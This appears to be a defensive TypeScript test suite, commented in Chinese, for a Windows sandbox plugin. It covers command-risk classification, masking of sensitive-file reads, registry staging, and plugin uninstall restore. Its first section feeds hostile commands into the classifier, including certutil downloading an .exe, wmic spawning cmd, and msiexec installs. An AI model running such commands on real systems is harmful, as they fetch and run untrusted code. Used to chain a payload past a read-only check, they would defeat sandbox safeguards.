// @ts-nocheck —— 独立交叉验证套件：断言的是**判据**，不是"插件自己报了什么"。
/**
 * 交叉验证套件（四域边界 + Cordis 卸载 + 悬浮窗默认收起）
 *
 * ── 为什么单独一个套件 ──────────────────────────────────────────────────────
 * 本仓既有 25 个套件大多是**自证**形态（插件自己的纯函数测自己的实现）。本套件的
 * 定位不同：它是**外部复核** —— 每一条都是"先给出攻击形状，再断言结局"，
 * 且刻意**不复用**被测模块自己提供的判别入口（能复用就说明判据仍在插件手里）。
 *
 * ── 每条断言的构成（缺一不写）────────────────────────────────────────────────
 *   ① 攻击/故障形状（一条具体输入）
 *   ② 期望结局（不是"有日志"，而是"拒绝/收起/同步了状态"）
 *   ③ 反向对照（证明这条断言**能红**：既有行为若被还原，断言必须失败）
 *
 * 全部离线：不建子进程、不写真实注册表、不碰系统状态。
 */

import { readFileSync } from 'node:fs'
import { join } from 'node:path'
import { fileURLToPath } from 'node:url'
import { dirname } from 'node:path'

const HERE = dirname(fileURLToPath(import.meta.url))
const PKG = join(HERE, '..')

const checks = []
function ok(name, evidence) {
  checks.push({ pass: true, name, evidence })
  process.stdout.write(`  ✓ ${name}\n`)
  if (evidence) process.stdout.write(`      证据: ${evidence}\n`)
}
function bad(name, evidence) {
  checks.push({ pass: false, name, evidence })
  process.stdout.write(`  ✗ ${name}\n`)
  if (evidence) process.stdout.write(`      证据: ${evidence}\n`)
}
function assert(cond, name, evidence) {
  if (cond) ok(name, evidence)
  else bad(name, evidence)
}
function section(title) {
  process.stdout.write(`\n=== ${title} ===\n`)
}

const readSrc = (rel) => readFileSync(join(PKG, rel), 'utf8')

// ═══════════════════════════════════════════════════════════════════════════
// 1. 危险命令拦截
// ═══════════════════════════════════════════════════════════════════════════
section('1. 危险命令拦截（降级档只读白名单不得一票放行）')

const { classifyCommandRisk } = await import('../src/executor.ts')
const { msiFamilyCommandVerdict } = await import('../dsh-plugin/shell-executor.ts')

/**
 * 攻击形状 A：`echo`（已知只读）打头，`&` 之后挂一个表里没有的下载器。
 * 旧实现：① 无写入型操作符 ② `certutil` 不在写类动词表 ④ 首 token `echo` 已知只读
 *        ⇒ 走到"readOnlyHitCount > 0"判成 READ_ONLY ⇒ 降级档 `bypassed:'read-only'` 放行
 *        ⇒ 降级档没有 shim ⇒ **直写真实磁盘**。
 */
const shapeA = classifyCommandRisk('echo ok & certutil -urlcache -f http://x/a.exe C:\\tmp\\a.exe')
assert(
  shapeA.risk !== 'read-only',
  '`echo ok & certutil …` 不得被判成只读（首 token 的只读不能洗白后续载荷）',
  `risk=${shapeA.risk}；理由=${shapeA.reasons.join(' / ')}`,
)

const shapeB = classifyCommandRisk('dir & wmic process call create "cmd /c whoami"')
assert(
  shapeB.risk !== 'read-only',
  '`dir & wmic …` 不得被判成只读',
  `risk=${shapeB.risk}`,
)

// 反向对照：真正的只读命令**仍然**要判只读（否则这条门会变成"一律拒绝"，就没用了）
const controlA = classifyCommandRisk('cmd', ['/c', 'echo', 'hello'])
assert(
  controlA.risk === 'read-only',
  '对照：`cmd /c echo hello` 仍判只读（实参 `hello` 不得被误判成未知程序）',
  `risk=${controlA.risk}`,
)
const controlB = classifyCommandRisk('git', ['status'])
assert(controlB.risk === 'read-only', '对照：`git status` 仍判只读', `risk=${controlB.risk}`)

// 下载落盘的长选项：旧式样 `-[oO]\b` 匹配不到 `--output`
const shapeC = classifyCommandRisk('curl', ['--output', 'C:\\tmp\\a.exe', 'https://x/a.exe'])
assert(shapeC.risk === 'write-capable', '`curl --output <file>` 必须判成可写', `risk=${shapeC.risk}`)

// ── MSI 闸门 ────────────────────────────────────────────────────────────────
assert(
  msiFamilyCommandVerdict('start msiexec /i C:\\tmp\\a.msi').blocked === true,
  '`start msiexec …` 必须被拦（`start` 是 Start-Process 的内建别名）',
  `matched=${msiFamilyCommandVerdict('start msiexec /i C:\\tmp\\a.msi').matched}`,
)
assert(
  msiFamilyCommandVerdict('net1 start msiserver').blocked === true,
  '`net1 start msiserver` 必须被拦（系统自带 net1.exe）',
  `matched=${msiFamilyCommandVerdict('net1 start msiserver').matched}`,
)
assert(
  msiFamilyCommandVerdict('sc \\\\127.0.0.1 start msiserver').blocked === true,
  '`sc \\\\host start msiserver` 必须被拦（三个 token 不必紧邻）',
  `matched=${msiFamilyCommandVerdict('sc \\\\127.0.0.1 start msiserver').matched}`,
)
// 对照：保守面不变 —— 只是"提到名字"不拦
assert(
  msiFamilyCommandVerdict('Get-Process msiexec').blocked === false,
  '对照：`Get-Process msiexec`（提到名字但不运行安装）仍不拦',
  '保守面逐字不变',
)

// ═══════════════════════════════════════════════════════════════════════════
// 2. 敏感文件遮蔽
// ═══════════════════════════════════════════════════════════════════════════
section('2. 敏感文件遮蔽（读入口必须全覆盖）')

const stagingFsSrc = readSrc('dsh-plugin/staging-fs.ts')
/**
 * `stat` / `lstat` 是读入口，却在**早退之前**没有任何遮蔽判定：
 * 哪怕 `readPolicy:'block'` 也拦不住，且连"只记"那一条可见性记录都不产生
 * ⇒ 存在性与文件大小可读，而面板 `readVisibility` 对此一无所知。
 */
/** 取某个 `async <fn>(…) { … }` 的源码体（按缩进为 4 空格的收尾 `}` 切，不用脆弱的行数上限） */
function fnBody(source, name) {
  const start = source.indexOf(`async ${name}(`)
  if (start < 0) return ''
  const end = source.indexOf('\n    }\n', start)
  return end < 0 ? source.slice(start, start + 2000) : source.slice(start, end + 6)
}

for (const fn of ['statInner', 'lstatInner']) {
  const text = fnBody(stagingFsSrc, fn)
  assert(
    /guardMaskedRead\(/.test(text),
    `\`${fn}\` 必须在早退之前调用 guardMaskedRead（第五条/第六条读入口）`,
    text.length > 0 ? `命中 ${(text.match(/guardMaskedRead\(/g) ?? []).length} 次` : '未取到函数体',
  )
}
// 反向对照：四条既有入口仍在，没被改坏
const guardCalls = (stagingFsSrc.match(/guardMaskedRead\(/g) ?? []).length
assert(
  guardCalls >= 7,
  '对照：六个读入口 + 定义/内部调用都在（guardMaskedRead 出现 ≥7 次）',
  `出现 ${guardCalls} 次`,
)

// ═══════════════════════════════════════════════════════════════════════════
// 3. 注册表暂存与应用
// ═══════════════════════════════════════════════════════════════════════════
section('3. 注册表暂存与应用（应用后不得仍停在待审 / 不得报成功其实没写）')

const registryStageSrc = readSrc('src/registry-stage.ts')
const applyBody = /function apply\(opts = \{\}\) \{[\s\S]*?\n  \}\n/.exec(registryStageSrc)
const applyText = applyBody ? applyBody[0] : ''
assert(
  /syncQueueStatus\(/.test(applyText),
  '`apply()` 必须把终态同步进 queue.json（否则批准后面板仍列同一批、pending 恒 true）',
  applyBody ? '命中' : '未取到 apply() 函数体',
)
assert(
  /function syncQueueStatus\(/.test(registryStageSrc),
  '同步函数存在，且与 `discard()` 的队列写入同一口径',
  'discard() 一直有这一步，apply() 此前漏了',
)

const reviewSrc = readSrc('dsh-plugin/review-service.ts')
const approveBody = /_approveRegistry\(selection\) \{[\s\S]*?\n  \}\n/.exec(reviewSrc)
const approveText = approveBody ? approveBody[0] : ''
assert(
  /for \(const entry of stale\)/.test(approveText) && /failed\.push/.test(approveText),
  '`_approveRegistry` 必须把 stale 并入 failed（全部 stale 时不得返回 ok:true）',
  approveBody ? 'stale 影响 ok' : '未取到函数体',
)

// ═══════════════════════════════════════════════════════════════════════════
// 4. Cordis 卸载协议 + 卸载可恢复
// ═══════════════════════════════════════════════════════════════════════════
section('4. Cordis 卸载协议 / 卸载后客户端修改可恢复')

const hostSrc = readSrc('dsh-plugin/host-plugin.ts')
assert(
  /disposeReviewServices/.test(hostSrc) && /ctx\.effect\(/.test(hostSrc),
  'host 行必须用 `ctx.effect()` 注册进程内单例的清理（模块级 Map 不会随卸载求值新实例）',
  'SERVICES / EFFECTIVE_STAGING / READ_VISIBILITY',
)
assert(
  /command \$\{spec\.name\}/.test(hostSrc),
  '7 条 `/winstage*` 命令的 disposer 必须交给 cordis（旧实现只取 .length 后丢弃）',
  'scope.effect(...) per command',
)
assert(
  /webServer\.register\(\) 未返回 disposer/.test(hostSrc),
  '面板路由拿不到 disposer 必须**响**（error 级），不能静默接受 undefined',
  '"失败必须响"',
)
const watchSrc = readSrc('dsh-plugin/baseline-watch.ts')
assert(
  /不会.*随插件卸载停止/.test(watchSrc),
  '基线轮询的回退分支（无 ctx.effect）必须如实告警',
  '定时器永不停止',
)

// ── 卸载还原工具：真实跑一遍（临时副本，不碰用户 profile） ────────────────────
const { planRestore } = await import('../tools/uninstall-restore.ts')
const { mkdtempSync, writeFileSync, readFileSync: readFs } = await import('node:fs')
const { tmpdir } = await import('node:os')
const tmp = mkdtempSync(join(tmpdir(), 'winstage-restore-'))
const patch = join(tmp, 'cordis.patch.yml')
writeFileSync(
  patch,
  [
    '# demo',
    '- id: agent-default-model',
    '  name: "@deepseek-ai/dsh-agent-default-model"',
    '  config:',
    '    model: deepseek-flash',
    '- id: pwsh-sandbox',
    '  name: "@deepseek-ai/dsh-pwsh-sandbox"',
    '  disabled: !!js (process.env.WINSTAGE_SHELL !== \'0\')',
    '- id: winstage-sandbox',
    '  name: "dsh-winstage-sandbox"',
    '  config:',
    '    enabled: true',
    '- id: fs-sandbox',
    '  name: "@deepseek-ai/dsh-fs-sandbox"',
    '  disabled: true',
    '',
  ].join('\n'),
  'utf8',
)
const plan = planRestore(patch)
assert(plan.ok && plan.changed, '卸载还原工具必须识别出本插件写入的条目', `code=${plan.code}`)
const after = plan.after ?? ''
assert(
  /winstage-sandbox/.test(after) === false,
  '还原后覆盖层里不再有 `winstage-sandbox` 行',
  after.includes('agent-default-model') ? '用户自己的行被保留' : '用户行丢失（!!）',
)
assert(
  /pwsh-sandbox/.test(after) === false && /fs-sandbox/.test(after) === false,
  '还原后平台 `pwsh-sandbox` / `fs-sandbox` 的让位行一并摘除（否则卸载后无 shell 提供方）',
  '结构性死局的修复点',
)
assert(
  /agent-default-model/.test(after),
  '对照：用户自己的条目必须原样保留（只摘本插件写的）',
  'agent-default-model 仍在',
)
assert(
  planRestore(join(tmp, 'nope.yml')).ok === false,
  '对照：没有覆盖层时如实报"无需还原"（不是成功、也不是失败）',
  'code=no-profile-patch',
)

// ═══════════════════════════════════════════════════════════════════════════
// 5. 审批悬浮窗：安装后默认收起
// ═══════════════════════════════════════════════════════════════════════════
section('5. 审批悬浮窗默认收起（未设置偏好 = 收起）')

const clientSrc = readSrc('dsh-plugin/client.ts')
assert(
  /const collapsedPref = \(\) => readStr\(localStore, PREF_KEY\) !== '0'/.test(clientSrc),
  '偏好未设置时必须按"收起"处理（`!== \'0\'`，不是 `=== \'1\'`）',
  '缺省值站在"少打扰"一侧',
)
const stalePref = (clientSrc.match(/readStr\(localStore, PREF_KEY\) === '1'/g) ?? []).length
assert(stalePref === 0, '三处读取点必须全部改用新口径（不得残留 `=== \'1\'` 的旧判据）', `残留 ${stalePref} 处`)

// 纯函数切片求值（与 `.t/collapse-selftest.ts` 同一手法：按 #region 取出后 eval）
const region = /function nextDismissed\(state\) \{[\s\S]*?\n    \}\n/.exec(clientSrc)
let nextDismissed
if (region) {
  // eslint-disable-next-line no-new-func
  nextDismissed = new Function(`${region[0]}; return nextDismissed`)()
}
if (typeof nextDismissed !== 'function') {
  bad('能取到 `nextDismissed` 纯函数切片', '未匹配到函数体')
} else {
  ok('能取到 `nextDismissed` 纯函数切片', '按 #region collapse-decision 切片求值')
  const collapsed = nextDismissed({ generatedAt: 'g1', pending: true, defaultCollapsed: true, applied: false })
  assert(collapsed.dismissed === 'g1', '偏好为"收起"时：首版有待审快照即收起', `dismissed=${collapsed.dismissed}`)
  const expanded = nextDismissed({ generatedAt: 'g1', pending: true, defaultCollapsed: false, applied: false })
  assert(expanded.dismissed === undefined, '对照：用户显式关掉偏好 ⇒ 不收起', `dismissed=${expanded.dismissed}`)
  const once = nextDismissed({ generatedAt: 'g2', pending: true, defaultCollapsed: true, applied: true })
  assert(once.dismissed === undefined, '对照：默认收起只生效一次（新快照不得被反复压回）', 'applied 标记')
}

// ═══════════════════════════════════════════════════════════════════════════
const failed = checks.filter((c) => !c.pass)
process.stdout.write(
  `\n========================================================================\n` +
    `交叉验证（四域边界 + Cordis 卸载 + 默认收起）：断言 ${checks.length} 项，失败 ${failed.length} 项\n` +
    `RESULT: ${failed.length === 0 ? 'PASS' : 'FAIL'} checks=${checks.length} failures=${failed.length} mode=normal\n`,
)
process.exit(failed.length === 0 ? 0 : 1)
